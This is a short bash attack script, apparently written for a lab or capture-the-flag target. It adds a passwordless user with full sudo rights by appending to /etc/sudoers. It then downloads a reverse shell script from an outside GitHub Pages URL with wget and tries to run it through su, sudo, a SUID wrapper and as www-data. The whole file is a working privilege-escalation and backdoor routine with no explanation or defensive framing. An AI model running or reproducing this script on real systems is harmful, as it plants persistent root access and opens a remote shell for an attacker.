#!/bin/bash

# Define variables
NEW_USER="newuser"
REVSHELL_URL="https://lydacious.github.io/testpage/revshell.sh"

# Create a new user with no password and add it to sudoers (for elevated privileges)
useradd -m $NEW_USER
echo "$NEW_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Download the reverse shell script
wget $REVSHELL_URL -O /tmp/revshell.sh

# Make it executable
chmod +x /tmp/revshell.sh

# Attempt privilege escalation using the existing SUID binaries
# 1. Using su with elevated privileges to switch to the new user and run the reverse shell
echo "Running su command..."
/bin/su -c '/tmp/revshell.sh' $NEW_USER || echo "su command failed"

# 2. Attempting to use sudo to run the reverse shell
echo "Running sudo command..."
sudo -u $NEW_USER /tmp/revshell.sh || echo "sudo command failed"

# 3. Using the SUID wrapper if possible (if you've set it up to be run by root)
echo "Running suid_wrapper..."
/tmp/suid_wrapper || echo "suid_wrapper failed"

# 4. Final fallback: Run the reverse shell as www-data (may still be useful for other attacks)
echo "Running revshell as www-data..."
/tmp/revshell.sh || echo "Running as www-data failed"
